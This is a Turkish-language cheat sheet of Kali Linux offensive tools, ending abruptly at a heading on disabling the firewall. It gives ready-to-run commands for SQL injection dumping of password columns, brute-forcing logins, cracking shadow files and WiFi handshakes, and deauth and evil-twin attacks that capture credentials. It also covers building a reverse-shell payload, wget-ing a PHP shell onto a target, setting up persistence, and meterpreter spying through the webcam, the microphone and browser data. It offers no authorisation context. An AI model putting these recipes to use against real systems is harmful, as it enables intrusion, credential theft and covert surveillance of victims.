
# KALI LINUX
## 01.İNFORMATİON GATHERİNG (BİLGİ TOPLAMA) :
### PASİF BİLGİ TOPLAMA :
---
#### Dmitry :
    Hedef site hakkında bilgi toplamaya yarar. (ip, email, port, domain vb.)
#### netcraft :
toolbar.netcraft.com sitesinden site report kısmından bilgi toplanabilir. Chrome eklentisi mevcut.
#### shodan :
    www.shodan.io sitesinden bilgi toplanabilir. Özellikle sunucularla ilgili bilgiler. Birçok filtreleme yapılabilir. Filtre yapmak için kayıt olunmalı.
#### archive.org :
    Geçmiş tarihlerde alınan site yedeklerine bakma.
#### whois :
    `whois ip_adresi` sorgusu ile bilgi elde edinme
#### host :
    host komutu ile alan adının ip adresini görürüz.
#### Kullanıcı adlarından bilgi toplama :
    Webde bulunan kullanıcı adlarını farklı platformlardan sorgulayarak bu adlara ait farklı bilgiler elde edinilen siteler :  
    userrecon (linux)  
    checkusernames  
    sherlock  
    knowem  
#### Ters IP Sorgulaması
    Aynı sunucuda bulunan başka web sitelerini bulma  
    www.yougetsignal.com  
#### SSL Sertifikası Üzerinden Bilgi Toplama
    `ssllabs.com`  
    `sslshopper.com`  
    Kalide komut satırına -> `sslyze //hedef adres` aracıyla tarama yapılabilir.  
#### robots
    Arama motorlarında indexleme yapmak istediğimiz dosyaları robots.txt dosyasında belirtiriz. Site adının sonuna `/robots.txt` yazarak sitede index yapılması istenmeyen dosyaları görebiliriz.  
#### FOCA
    Metadata analizi yapılır. (office, pdf, svg dosyaları)  
#### snort
    Trafik analizi vb.
#### wappalyzer
    Web site eklentisi olarak çalışır. Site üzerinde çalışan hizmetleri ve versiyon bilgilerini gösterir.
#### paping
    Porta ping atmaya yarar. Windows tabanlı çalışır.  
    `paping -p port_numarası ip_adresi`
### AKTİF BİLGİ TOPLAMA :
---
#### NETDİSCOVER :
    Bağlı bulunan ağdaki tüm ip adreslerini ve mac adreslerini gösterir.  
    `netdiscover -i eth0 -r 192.168.1.0/24` -> Ip aralığındaki tüm ip lere arp sorgusu gönderir ve ağdaki cihazları bulur.
#### NMAP :
-	Bilgi toplama aracıdır.
-	Ağda bulunan cihazları tespit eder.
-	Ağda bulunan cihazların işletim sistemlerini, portlarını, servisleri, güvenlik duvarlarını tespit eder.  
`nmap -sS 192.168.1.10`  
+--------------------------------+-----------------------------------------------------------+
| Parametre                      | Açıklama                                                  |
+================================+===========================================================+
| -sS                            | En hızlı tarama çeşiti                                    |
+--------------------------------+-----------------------------------------------------------+
| -sU                            | Udp taraması                                              |
+--------------------------------+-----------------------------------------------------------+
| -sA                            | Arada firewall varmı onu tarar.                           |
+--------------------------------+-----------------------------------------------------------+
| -sV                            | Servis taraması                                           |
+--------------------------------+-----------------------------------------------------------+
| -sn                            | Ayakta olan canlı sistemleri verir.                       |
+--------------------------------+-----------------------------------------------------------+
| -O                             | İşletim sistemi taraması                                  |
+--------------------------------+-----------------------------------------------------------+
| -sC                            | Scriptleri içeren tarama                                  |
+--------------------------------+-----------------------------------------------------------+
| -Pn                            | Pingsiz tarama                                            |
+--------------------------------+-----------------------------------------------------------+
| -f                             | Paketleri parçalayarak gönderir.(Firewall atlatma tekniği)|
+--------------------------------+-----------------------------------------------------------+
| -n                             | İsim çözümleme yapmasın                                   |
+--------------------------------+-----------------------------------------------------------+
| -r                             | Portları sıra numarasına göre sırayla tara                |
+--------------------------------+-----------------------------------------------------------+
| -oA                            | Çıktıyı tüm formatlarda dosyaya yazdırma.                 |
+--------------------------------+-----------------------------------------------------------+
| --open                         | Sadece açık portları göster                               |
+--------------------------------+-----------------------------------------------------------+
| --osscan-guess                 | İşletim sistemi hakkında daha güçlü tahmin eder.          |
+--------------------------------+-----------------------------------------------------------+
| --interactive                  | nmap komut satırına düşebiliriz                           |
+--------------------------------+-----------------------------------------------------------+
| --top-ports 100                | En çok kullanılan 100 portu tarar.                        |
+--------------------------------+-----------------------------------------------------------+
| -p 1-100                       | 1 ile 100 arası portları tarar.                           |
+--------------------------------+-----------------------------------------------------------+
| -p 1-100 --exclude-ports 23,25 | 1 ile 100 arası portları tarar, 23 ve 25 hariç            |
+--------------------------------+-----------------------------------------------------------+
| -p-                            | 65536 adet tüm portları tarar.                            |
+--------------------------------+-----------------------------------------------------------+


* Port Taraması :  Port bilgisi girilmezse en çok kullanılan 1000 portu tarar. 

* `--script script_adı`  ile script taraması yapar. scriptler internetten indirilebilir. `nmap/script` klasörü içinde olmalı.   
`nmap --script vuln site adı ya da ip adresi`   
`(vuln : Birçok script var. Scriptleri görmek için : “locate *.nse”)`  

* script ile firewall atlatma:	`--script=firewall-bypass.nse` 

* `nmap -D RND:5 ip adresi`	//RND:5 => rastgele üretilecek ip adres sayısı   
	Rastgele atanmış ip adresleri gönderip trafik oluşturarak güvenlik duvarını atlatmaya çalışır.

#### nbtscan :
    `nbtscan 10.0.2.0/24`  -> netdiscoverdan farkı biri arp sorgusu yapar, nbtscan ise netbios sorgusu yapar.   Dezavantajı karşı tarafın netbios’u kapalıysa onu tespit edemeyebilir.

#### superscan
    Windows üzerinden port tarama yapılır.  

#### Güvenlik Duvarı Tespit Etme
    `wafw00f`  github dan indir.  
    `wafw00f ip adresi yada domain adı`  
    `wafw00f -l` -> Tespit edilen güvenlik duvarlarını gösterir.  

#### Alt Domain Tespit Etme
##### fierce 
`fierce -dns site adı -wordlist /wordlist_yolu`
##### sublist3r

##### Subfinder
`Subfinder -v -d "site adı"`

#### E-mail Tespit Etme
##### theHarvester :
    Birçok farklı platformdan faydalanarak bilgi çeker. En çok kullanılan aktif ve pasif bilgi toplama araçlarından biridir.
    `theHarvester -d hedef_adı -l 500 -b all`  
    -l  =  arama sayfa sayısı  
    -b = nerede aranacağı

#### Benzer İsimde Domain Tespit Etme
##### urlcrazy

#### Hedefte Dizin Arama
##### dirbuster
`dirb http://site adı`  
    Site adının sonuna kendi wordlistinde bulunan kelimeleri ekler. Brute force saldırısı yapar. Sitedeki dizinleri bulur.  
    -S = Sadece başarılı çıktıları göster.  
    -r = Alt dizinlerde taramayı engeller.Sadece ana dizini arar.  
    -X .php = sadece php uzantılı sayfaları tarar.  

#### Sitede Açık Arama
##### Vega
##### w3af
##### nessus
    Network testlerinde daha başarılı
    Sitesinden ilgili sürümü indir.  
`dpkg -i Nessus-10.5.1-debian10_amd64.deb`  
`/bin/systemctl start nessusd.service`  
`systemctl start nessusd`  
`systemctl enable nessusd`  
`https://kali:8834`

##### acunetix
    Windows için Web Testlerinde daha başarılı
#### Bilinmeyen Dosya Hakkında Bilgi
##### exiftool
`exiftool dosya adı`
##### strings
`strings dosya adı`
#### SMB Zafiyet Analizi
**enum4linuz** aracıyla tarama yapılabilir.  
`smbclient –L hedef_ip` ile sistemde paylaşılan dosyalar görülebilir.  

### Google Hacking Database
    İlgili dorklar kullanılarak google üzerinden zafiyet tarar.

### DNS Keşfi Yapma
`nslookup domain adı`  
`dig domain adı`  
Dnsdumpster.com  
Securitytrails.com  

### DNMAP-SERVER, DNMAP CLİENT : 
    Ip bilgisi girerek ayrıntılı port taramaya yarar. Birden fazla hedef belirtilebilir.
### İKE-SCAN :
    Girilen hedef ip adreslerinin VPN olup olmadığını gösterir.
### MALTEGO : ***
	Hedef hakkında internet üzerinde bulunan tüm bilgileri gösterir. Maltego CE ücretsiz sürümü.

### POF :
	Bilgisayar ve kullanıcıların hangi server’a bağlandığını gösterir.

### RECON-NG :
	Sunucu ve web siteleri hakkında bilgi toplamaya yarar.
    1-	`show modüles` komutu ile kullanılacak modülleri görürüz.
    2-	`use seçtiğin_modül_adı`
    3-	`show options`
    4-	`set SOURCE site_adı`
    5-	`run`
	
### SPARTA :
	Lokal ağda zafiyet tespiti, açık port tespiti, açık portlara kaba kuvvet saldırısı yapar
### ZENMAP :
	Nmap programının görsel halidir
	Lokal ve genel ağ üzerinde tarama yapar.
	***(intense scan : En detaylı tarama)


### metagoofil :
	metagoofil -d google.com

## 02.VULNERABİLİTY ANALYSİS (ZAFİYET AÇIĞI ANALİZİ) :

### GOLİSMERO :
	Web sitesi üzerinde güvenlik açığı bulma
	“galismero scan site_adı”
### LYNİS :
	Linux ve Unix tabanlı sistemleri inceler, kusurları tespit eder.
### NİKTO :
	Site üzerinde zafiyet bulma
	“nikto -h ip adres ya da sunucu adı”
### UNİX-PRİVES-CHECK :
    Sıradan bir kullanıcının, root yetkisine sahip kullanıcının yaptıklarını yapabiliyormu diye test ediyor.Yani root olmayan bir kullanıcıya root’un erişebildiği yetkiler verilip verilmediğine bakar. Tarama sonunda WARNING yazıyorsa root dışında bir kullanıcıya yetki verilmiş demektir.
	“Unix-prives-check standart”

## 03. WEB APPLİCATİON ANALYSİS (WEB UYGULAMA ANALİZİ) :

### BURPSUİTE : ***
-	Ücretsiz versiyonu biraz kısıtlı
-	Zafiyet testi yapılır.
-	Kaba Kuvvet saldırısı yapar.
-	Proxy ile sitede değişiklik yapma.  
> Proxy kullanmak için gerekli olan ayar: Mozilla’da Ayarlar / Advanced / Network / Setting / Manuel proxy seç. http:127.0.0.1  port:8080 , alttaki tik işaretini aktif et  
Bu sayede site ile sunucu arasına girerek değişiklik yapmaya izin verecek.  
*intercept on olacak  
*Her adım için forward tıkla.

> **Sertifika Yükleme**  
  Https sitelerin içeriğini incelerken sorun yaşamamak için sertifika yüklemek gerekir. Proxy ayarlandıktan sonra tarayıcıya `http://burp` yazarak çıkan sertifika indirilir. Tarayıcı ayarlarından sertifika bölümünden İçe Aktar diyerek sertifika yüklenir.  
  
> **Sitelerin IP Kısıtlama Engelini Geçme**  
  Siteye giriş yapmaya çalış. Burp’de yakalanan bilgilerin altına;  
  X-Forwarded-For: Girişe izin verilen ip adresini gir.  
  Forward tıkla. Devam et.  
  
### COMMİX :
    Bir sitenin komut satırını ele geçirme.
    commix --url=sitenin adı

### HTTRACK :
    Bir sitenin kopyasını almaya yarar.
    Proje adı gir / Nereye kaydedileceğini gir / Site adı gir / 5 seçenekten birini seç / Enter / Enter / y


### OWASP-ZAP :	***
    Site zafiyetlerini bularak bilgileri döker. 
    Alan adı ya da ip adresi gir. Saldırı butonuna tıkla.

### SKİPFİSH :
	Site hakkında açıklar, resimler vb. bilgileri verir. Kaydedilen dosyada index.html aç.
	“skipfish -o /root/… http:site adı”

### SQLMAP : ***
Sql açığı bulunan sitelerde veri tabanına ulaşmamızı sağlar.  
`sqlmap -u açıklı site linki --dbs` => sitedeki sql açığını kullanarak veri tabanı ismini verecek.  
`sqlmap -u açıklı site linki -D veri tabanı ismi --tables` => Veri tabanı adını kullanarak tabloları verecek.  
`sqlmap -u açıklı site linki -D veri tabanı ismi -T table  adı --colums` => Tablo adını kullanarak kolonları verecek.  
`sqlmap -u açıklı site linki -D veri tabanı ismi -T table  adı -C user_pass --dump` =>kolonun içindeki şifreyi görme  

### WEBSCARAB :
	Proxy ile veri değiştirir. Spider özelliği ile link toplar.

### WPSCAN:
	Wordpress sitelerde bilgi toplamaya ve kaba kuvvet saldırısı yapmaya yarar.
    `wpscan --url site adı --enumerate p`  
    p= eklentileri bulur
    u=yönetici adını bulur
    t=temayı bulur  

    Kaba kuvvet saldırısı => “wpscan --url site adı --username admin --wordlist /root/…”

## 04. DATABASE ASSESSMENT (VERİTABANI DEĞERLENDİRME) :
	
### HEXOR BASE : ***
		Veri tabanlarını yönetmeyi sağlar. Kaba kuvvet  saldırısı yapar. Görsel arayüzlüdür.
### JSQL İNJECTİON :
    Sql zafiyeti bulunan sitelerin veritabanını ele geçirir. 
    Açıklı site adını yaz / Enter.  Tablolardan içeriğine bakarsın.
### MDB_SQL :
	2007 yılı öncesi mdb uzantılı veri tabanını destekliyor.Kullanılmıyor.
### OSCANNER :
	Oracle veri tabanını kullanan sunucularda bilgi toplamaya yarar. Programın desteği yok, kullanılmıyor.
### SİDGUESSER :
	Oracle veri tabanı kullanan sistemlerde kaba kuvvet saldırısı yaparak veri tabanı adlarını tespit etmeye yarar.
    “sidguess -i ip adresi -d /root/…liste dosyası -p port no”
    liste dosyası => Listedeki veri tabanı adları o sitedeki veri tabanında var mı diye kontrol eder.
### SQL DİCT :
	Sql serverlere kaba kuvvet saldırısı yapar.
    Server ip adresi yaz / Parolaların bulunduğu wordlist’i yükle / Target accont : administrator / Başlat
### SQL LİTE DATABROWSER :
	Veri tabanı oluşturmaya yarar. Var olan veri tabanını açmaya yarar.

### TNSCMD10G :
	Oracle veri tabanlarında bilgi toplamaya yarar.
    Oracle default port : 1521
    `tnscmd10g version -h ip adresi(site ip)`

## 05. PASSWORD ATTACKS (PAROLA SALDIRILARI):
	
### CEWL:
	Web site üzerinde şifre olabilecek kelimeleri toplar.Site üzerindeki kelimelerden wordlist oluşturur.
	“cewl siteadı –e –w /root/…”        e => Mail adresleri toplar
### CRUNCH : ***
	Wordlist oluşturmaya yarar.
	`crunch 2 5 123456 -o /root/….`
	`crunch 9 9 ‘1234’ -t Xbank@@@@ -o xbank.txt`  // 9 harften oluşan, içerisinde 1,2,3,4 rakamları olan, ilk 5 harfi Xbank olacak sonraki 4 harfini 1,2,3,4 rakamlarından kullan
### HASHCAT*** :
	Şifre kırmaya yarar.
	`hashcat  -m 0 /root/Desktop/kırılacak_sifre   /usr/share/wordlist/rockyou.txt --force`
    m = Kullanılan şifre kırma yönteminin id numarası
    force = düşük performansda çalışması için
    Wordlist olmadan kaba kuvvet ile de kırar.

### JOHN :
	`john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/hash dosyası`
    Büyük wordlist ile şifre yakalama :
    Wordlist çok büyükse arada bir durdurup devam ettirmek istersek john ve aircrack-ng birlikte kullanırız.
    `john --wordlist=wordlist_dosya_adı --stdout --session=James | aircrack-ng -w -b modem_mac handshake_dosyası`
    q ile duraklat, sonra ;
    `john --restore=james | aircrack-ng .........`    kaldığı yerden devam eder.  
    
    **Crunch ile Kullanımı :**
    Duraklatma yapabilmek için Crunch ile wordlist yapıp john programına girdi olarak göstericez. Sonra john programına çıktı olarak aircrack programıyla tarama başlatıcaz.
    `crunch 8 8 | john --stdin --session=lars --stdout | aircrack-ng -w -b modem_mac handshake dosyası`


### Hash Identifier :
    Hash değerini yazınca hangi şifreleme yöntemiyle şifrelendiğini gösterir.
		
### JOHNNY :
	john programının görsel hali
### unshadow :
	passwd ve shadow dosyaları linuxda kullanıcı parolalarının tutulduğu dosyalar. unshadow komutu ile bu iki dosyayı birleştirip .txt olarak çıkarıyoruz. Elde edilen hash dosyasını john yada jonny gibi programla kırıyoruz.
	`unshadow  /etc/passwd /etc/shadow > root/cıkarılacak_dosya_yolu`

### hydra*** :
	Brute force saldırısı yapmaya yarayan araç.
	`hydra -l kullanıcı_adı -p parola hedef_ip ssh`
    L : kullanıcı wordlist
    P : parola wordlist
    Örnek: (Burp ile login sayfasından alınan değerleri hydraya vererek kullanıcı adını bulma)
    `hydra –L user_list –p parola ip_adresi http-post-form ‘/wp-login.php:log=^USER^&pwd=parola&diğer_girdiler:F=Invalid username’`
    F= hata mesajını belirt. 
    Hata mesajı vermeyen satır doğru sonucu verecek.
### medusa :
    Servislere yönelik kaba kuvvet saldırısı yapar.
    `medusa -h ip_adresi -M ftp -U /root/kullanıcıların_bulunduğu_dosya -P  /parola_wordlisti`
    h = h ile ip adresi belirt
    M = servis belirt

### Ncrack :
    Servislere kaba kuvvet saldırısı yaparak kullanıcı adı şifre tespit eder.
    `ncrack -p 21 -U /root/kullanıcı_adı_dosyası -P /root/parola_dosyası ip_adresi`


### OphCrack :
    Windows sistemlerin hash değerli şifrelerini kırar.
    ophcrack sitesinden tables gir. hazır wordlist dosyalarından yarayanı indir.
    table > install > klasörü seç > load > single hash > crack

### Pyrit :
    Kablosuz ağlara yönelik handshake dosyasının kırılmasında kullanılır.
    `pyrit -r /.cap_uzantılı_dosya_yolu -i /parola_wordlist attack_passthrough`

### Cain & Abel :
    Windows için parola saldırı aracı. Linux için benzer program DSniff

### gp3finder :
    Windows’ta domain controller makinede Windows/sysvol/sysvol/user.local/policies/{hash}/machine/preference/groups/groups.xml dizininde oturum açan kullanıcılara ait kullanıcı adı ve parola bilgilerinin hash hali bulunur. Elde edilen bu hash değeri gp3finder aracına vererek parolayı açık şekilde elde edebiliriz.
    `gp3finder.exe -D hash_parola_değeri`
    
## 06. WİRELESS ATTACKS (KABLOSUZ SALDIRI):

### Airmon-ng
    Ağ kartını dinleme moduna almaya yarar.
    
    Bağlı adaptörleri görme:
    `iwconfig  / airmon-ng`
    
    Ağ kartını dinleme moduna alma :
    1.	`airmon-ng start wlan0` 
    2.	`iwconfig wlan0 mode monitor`
    3.	`iw dev wlan0 set type monitor`  // “iw dev wlan0 info” ile kontrol edebilirsin
    Üç farklı işlem ile yapılabilir. Bitince wlan0mon moduna geçer.
    Modlar arası geçiş yaparken ağ kartını devre dışı bırakmayı unutma. ( “iwconfig wlan0 up / down” )
### Airodump-ng
    Etrafındaki kablosuz ağları listeleme :
    `airodump-ng wlan0mon`
    NOT: Ağ kartını dinleme moduna alıp wireshark ile etraftaki ağlar hakkında bilgi toplayabilirsin.
    
    Kanala özel tarama yapma:
    `airodump-ng wlan0mon -c kanal no`
    
    Erişim noktalarının üreticisi hakkında bilgi edinme:
    `airodump-ng wlan0mon --manufacturer`
    
	Üretici listesini güncellemek için:  
	`airodump-ng-oui-update`
	
    Hedef kablosuz ağ hakkında handskahe yakalama :
    `airodump-ng -b bssid_adresi -C kanal_no -w /root/Desktop... wlan0mon`
    -b (--bssid) = Hedef mac adresi
    WPA handshake yazana kadar bekle. .cap dosyası oluşacak. 
    
    `--uptime` komutu ile ağın ne kadar süredir yayın yaptığını kontrol edebiliriz.
	`airodump-ng  wlan0mon -w /root/Desktop... --uptime`

### Aireplay-ng 
    Wifi ağından cihaz düşürmede kullanılır. Cihazın ağdan düşüp tekrar bağlanması ya da yeni bir kullanıcının ağa bağlanması sırasında handshake dosyası yakalanır. Bu dosya içerisinde ağın parolası hakkında bilgi vardır.
    
    Tek Cihaz Saldırısı:
    `aireplay-ng --deauth 5 -a hedef_modem_mac_adresi -c hedef_cihaz_mac_adresi wlan0mon`
    5 sayısı gönderdiği paket sayısı, ne kadar artarsa ağdan kopma süresi artar.
    `aireplay-ng --deauth 5 -a modem_mac_adresi -c hedef_mac_adresi wlan0mon & > /dev/null&`
    Enter basınca pid no verir, arka planda çalışır. Aynı komutu girip hedef mac adresini değiştirip ikinci cihaza saldırı başlatılabilir. 
    
    `jobs` komutu ile arka planda çalışanlar görülür. 
    `kill %sıra no` komutu ile işlem durdurulur.
    `killall aireplay-ng` komutu ile tüm işlemler durdurulur.
    
    Çoklu Cihaz Saldırısı:
    `aireplay-ng --deauth 1000 -a modem_mac_adresi`

### Aircrack-ng
    Yakalanan handshake dosyasına parola saldırısı yaparak wifi ağının parolasını elde etmeye yarar.
    `aircrack-ng -w /root/wordlist_yolu -b bssid_adresi /root/kırılacak_dosya -0`
    // -0 komutu komut satırını renklendirerek daha güzel görsel sağlar 
    
    Site üzerinden kırma işlemi : https://aircloud-ng.me

### Airbase-ng
    Sahte erişim noktası oluşturmaya yarar.
    `airbase-ng -c 1 -e “SSID” wlan0mon`
    -Z 1-5 arası şifreleme algoritmalarını belirtir. –Z 2 WPA2-PSK;TKIP mesela.
### Chirp :
	Telsizleri programlamaya yarayan bir araç.
### Fern wifi cracker :
	Kablosuz ağların şifrelerini kırmaya yarar.
### Giskısmet :	
	Kısmet programının dosyalarını farklı formata çevirmeye yarar.(veritabanı formatına)
	`giskismet -x /root/.netxml dosyasını göster.`
	Veri tabanı dosyası oluştu. db browser programıyla aç.
### Kismet : 
	Etrafta bulunan kablosuz ağlar hakkında bilgi toplamaya yarar.
### Mdk3 :	
	Etrafta bulunan kablosuz ağların internete çıkmasını engeller. Hedef mac adresini bilmek gerekir.
	`mdk3 wlan0mon d -w /root/hedef_mac_adresinin_olduğu_txt_dosyası`
    Ctrl+c ile işlem durdurulur.

### Mfoc :
	Akıllı kart sistemlerindeki parola korumalı yönetim dosyalarının parolasını kaba kuvvetle kırmaya yarar.
### Mfterm :
	Akıllı kartlarda yeni eklemeler yapar. Akıllı kartı programlar.
### Wifite :
	WPS destekli ağlarda pin no tespit ederek ağın şifresini ele geçirir. Handshake dosyası yakalayarak şifreyi kırar.
### Fluxion
    Sahte ağ kimliği yaratarak hedefin o ağa bağlanmasını ve şifresini elde etmemizi sağlar.
### WifiSlax
    Güzel bir araç. Araştırılacak..
### Reaver
    WPS korumalı modemlerin şifrelerini kırmaya yarar.
    Monitör moduna geçilir. Etraftaki wps özelliğini kullanan modemleri listelemek için;
    `wash -i wlan0mon`
    
    WPS kırmak için ;
    `reaver --bssid modem_mac --channel 1 -i wlan0mod`
    
    Yetki hatası verirse;
    `aireplay-ng --fakeauth 60 -a modem_mac -h kendi_mac wlan0mon`
    
### Etraftaki Erişim Noktaları Hakkında Bilgi Edinme (Windows)
    Cmd komut satırına `netsh wlan show networks` yazarak etraftaki erişim noktalarını listeleriz.
    `netsh wlan show profiles` -> Pc nin bağlandığı ağların listesi
    Detaylı listeleme için `netsh wlan show networks mode = bssid`

### Sahte Modem Yayını:
    Easy Creds aracını araştır.  Başka yöntem;
    3 şey gerekli. Yayın yapan bir cihaz. DHCP sunucusu ve DNS sunucusu.
    hostapd ve dnsmasq yazılımlarını indir.
    Önceden yönlendirme yapıldıysa hata vermesin diye tüm yönlendirme tablolarını silme;
    `service network-manager stop`	      -> Önce network durdurulur.
    `echo 1 > /proc/sys/net/ipv4/ip_forward`  -> Bu dosyadaki 0 değerini 1 yaptık.
    `iptables --flush`
    `iptables --table nat --flush`
    `iptables --delete -chain`
    `iptables table nat --delete -chain`
    `iptables -P FORWARD ACCEPT`
    
    hostapd.conf dosyasını düzenleme: 
    interface = wlan0
    ssid      = ağ adı
    channel   = 3
    
    dnsmasq.conf dosyasını düzenleme:
    interface	=	wlan0
    dhcp-range	=	10.0.0.10,  10.0.0.100, 8h
    dhcp-option	=	3,  10.0.0.1 (modem ip)
    dhcp-option	=	6,  10.0.0.1 (dns sunucusu)
    addresss	=	/#///10.0.0.1 (her geleni yönlendir)
    
    `dnsmasq -C dnsmasq.conf dosya_yolu`
    `hostapd -c hostapd.conf dosya_yolu -B`   (B: background çalışma)
    
    Sahte modeme hedef girdiğinde onu ilk bağlandığında yada farklı siteler açmaya çalıştığında bizim oluşturduğumuz index.html sayfasına yönlendirmek için;
    /etc/apache2/sites-enabled/000-default.conf dosyasını düzenle.Sonra şu  komutu çalıştır;
    `a2enmod rewrite`
    
### WEP Parola Kırma
    1.	Dinleme modda hedef cihazın mac adresini öğren.
    2.	Hedefe arpreplay ile paket gönderimi yap.
    3.	Aircrack-ng ile dataların artmasına göre parolayı kırmayı dene.

### WPA2 Enterprise
    Kurumsal sahte ağ yayını oluşturma.
    
    Uygulamayı kur.
    `apt-get install hostapd-wpe`
    
    interface ve ssid ayarlarını değiştir.
    `leafpad /etc/hostapd-wpe/hostapd-wpe.conf`
    
    Sahte yayını başlat.
    `hostapd-wpe -c /etc/hostapd-wpe/hostapd-wpe.conf`
    
    Hedef sahte ağa kullanıcı adı ve parola ile giriş yaptığında bilgiler ekrana gelir. Gelen bilgiler arasında kullanıcının hash değeri yakalanmış olur. Bu hash değerini jtr , hashcat gibi araçlarla kırabileceğimiz gibi asleap aracıyla da kırabiliriz;
    `asleap -C challenge -R response -W wordlist yolu`

    Sahte kurumsal ağa bağlanmak isteyen bir kullanıcıya sertifikaya güven uyarısı çıkabilir. Burada güvenli bir sertifika oluşturmak için farklı yollar mevcut.
    
    1.	Gerçek kurumsal ağa bağlanma isteği göndeririz. Parola doğru olsun olmasın ağın detaylarına baktığımızda kurumun sertifika bilgilerini görürüz. Sahte ağımıza bu sertifika bilgilerini girerek bağlanacak kişilerin güvenini daha da kazanmış oluruz.
    
    2.	Ağ kartını dinleme moduna alarak Wireshark aracıyla hedefimizi dinlemeye alırız. Yakalanan veri paketlerini incelediğimizde sertifika bilgilerinin yakalandığını görürüz. 
    Filtre parametresi olarak    =>    “ssl.handshake.certificates”
    
    3.	Tshark aracıyla yakalanan pcap dosyası içerisinden sertifika bilgilerini elde etme
        tshark -nr sslcert.pcap  -2 -R “ssl.handshake.certificate” -V
        
#### eaphammer
    Sahte sertifika oluşturma aracı
    `./eaphammer --cert-wizard`
    Elde edilen sertifika bilgilerine göre istenilen değerleri girerek aynı sertifikadan üretmiş oluruz.

### Sahte Yetkilendirme:
    Hedef ağ ile ilgili handshake dosyası yakalamak için o ağda veri akışı olmalı yada ağa birilerinin girip çıkması gerekli. Deauth saldırıları ile ağdan kullanıcı düşürebilmiştik. Bunların olmadığını varsayalım. Sahte yetkilendirme ile hedef modem üzerinde kendimize yetki verip sonrasında içeriye paket göndererek veri alış verişini sağlarız.Böylece handshake bilgisi yakalamaya imkan yaratırız. 
    
    Modem üzerinde kendimize yetki verme:
    `aireplay-ng --fakeauth 0 -a hedef_modem_mac -h kendi_mac_adresimiz wlan0mon`
    
    Paket Yükleme:
    `aireplay-ng --arpreplay -b hedef_mac -h kendi_mac wlan0mon`
    -h : Paketin kimden yükleneceğini belirtiyoruz. Hedef client makinenin mac adresini girerek ondan modeme paket gönderiyormuş gibi yapmak daha mantıklı.
    
### İsmi Gizli Olan Wifi Ağının Adını Bulma:
    1-	Dinleme moda al
    2-	ESSID bölümünde <length:0> yazanlar adını gizlemiştir. //buradaki 0 ağın adının karakter sayısını verir
    3-	`airodump-ng --channel 4 --bssid mac_adresi wlan0mon`
    4-	Ağdaki herhangi bir kullanıcı ağdan düşüp tekrar bağlandığında ya da yeni biri ağa bağlandığında ağ adı gelir.

### Windows Wifi Parolasını Görme
    Wifi bağlantılarını görme;
    `netsh wlan show profiles`
    
    Bağlı bulunulan ağın parolasını görme;
    `netsh wlan show profile “wifi ağ adı” key=clear`
    
## 07. EXPLOİTATİON TOOLS (İSTİSMAR ARAÇLARI):

### Armitage :
	Sistemlere sızmaya yarayan bir program. Metasploit yazılımın görsel hali.
### Beef XSS Framework :	
	Tarayıcı ele geçirmek için kullanılır. URL sağ tıkla tarayıcıda aç. Kullanıcı adı ve şifre: beef
### Metasploit :
	auxiliary : Bilgi toplama üzerine uygulama.
	exploit : Sisteme erişmeyi sağlayan kod parçacığı.
	payload : Sisteme eriştikten sonra ne yapılacağını belirten kod parçacığı
    encoder : Payloadların antivirüs programlarına yakalanmasını önlemek için şifreleme    yöntemlerini kullanarak gizlenmesini sağlar.
    
    search winrar  = İstediğimiz uygulama hakkında yazılmış bir exploit varmı diye bakar.
    “msfconsole”
    “use exploit_adı”
    “show options” 	
    “set RHOSTS 192.168.1.10”
    “exploit”
    
    Başlangıç Ayarları : service postgresql start  -- msfdb init  -- msfdb run

    workspace –a  =>  çalışma alanı oluştur.  –d ile alanı siler.
    db_import /dosya_yolu  => içeri dosya yükleme
    
### Metasploit Community:
    Metasploit yazılımının görsel ve daha düzenli hali. Tarayıcıdan adını aratarak indirin.(Kayıt gerektirir.) 
    “chmod +x indirilen_dosya_adı” ile yüklemek için yetki veriyoruz. Yükledikten sonra explorer satırına “localhost:3790” yaz. Yeni kullanıcı oluştur. Rapid7 sitesinden lisansla.
    
### msfvenom
    msfconsole’un payload oluştuma modülüdür.
    `msfvenom -p payload_adı LHOST=kendi ipmiz LPORT=4444 -f exe -o /cıkıs_yolu/payload.exe`
    
    Dış ağa bağlanırken LHOST yerine dış ağ ip adresimizi yazıcaz. Yazdığımız port’u modemden açmamız gerekecek. Modem ayarlarından port no gir. ip adresi yerine local ip adresimizi gireceğiz.
    **netsec.ws sitesi hazır payload örnekleri sunuyor.
    
    Trojan oluştuktan sonra dinlemeye almak için;
    “msfconsole”
    “use exploit/multi/handler”
    “set payload payload_adı”
    “set LHOST local ip miz”
    “set LPORT 4444”
    “run”
    “sessions”	 -> Açık bağlantıları gösterir.
    “sessions -i 1”	 -> Birinci bağlantıyı açar.
    
#### msf ile shell alma
    1.	msfvenom ile payload oluştur. (php/meterpreter/reverse_tcp)
    2.	kendi pc mizde http server aç.  (“python -m SimpleHTTPServer”) 
    Not: python3 ile : python –m http.server 
    3.	Hedef pc ‘de cmd satırında:   “wget http://kendi_ipmiz:8000/shell.php -O a.php”
    // kendi pcmizde oluşan shell.php yi a.php olarak hedef pc ye aldık
    4.	Tetiklemek için:
    a.	Kendi pc mizi dinleme moda al
    b.	Hedef pc de adres satırına yolu yaz. (../a.php) yada komut satırına “php a.php” yaz

#### Kalıcı bağlantı sağlamak için
    Pc her açıldığında otomatik olarak kalıcı bağlantı sağlamak için;
    “handler > use exploit/windows/local/persistence”
    “show options”
    “set exe_name ......”
    “set session 1”
    “show advanced”
    “set exe::custom /var/.......payload adı”
    
#### Meterpreter  Komutları (Sızma Sonrası Yapılanlar)
    Dosya İndirme
    download -r dosya adı /root/nereye kaydedileceği
    
    Dosya Yükleme
    upload -r /root/gidecek dosya yolu   C:\..\gideceği yer
    
    Ekran Görüntüsü Alma
    screenshot		=	Direk alır, kaydeder
    screenshot -p  /.../	=	Kayıt yolu belirt
    screenshot -q 200	=	Çözünürlük arttırma
    screenshot -v true	=	Direk görüntü açar
    “run vnc” komutu ile meterpreter satırında hedefin ekran görüntüsünü canlı video olarak getirme.
    
    Ses Kaydı Alma
    record_mic
    
    Webcam Görüntüsü Alma
    webcam_chat		=	Karşılıklı kamera görüşme
    webcam_list		=	Varolan kamera listesi verir
    webcam_snapt		=	Listelenen kamera arasından seçim yapma
    webcam_stream	=	Hedef kamera açıp canlı izleme yapma
    
    Web Browser’dan Bilgi Çekme
    Alınan verileri okumak için “sqllite database” uygulamasını kullanırız
    run enum_chrome	=> Chrome ile ilgili bilgileri çeker
    run enum_firefox	=> Firefox ile ilgili bilgileri çeker
    
    Güvenlik Duvarını Kapatma
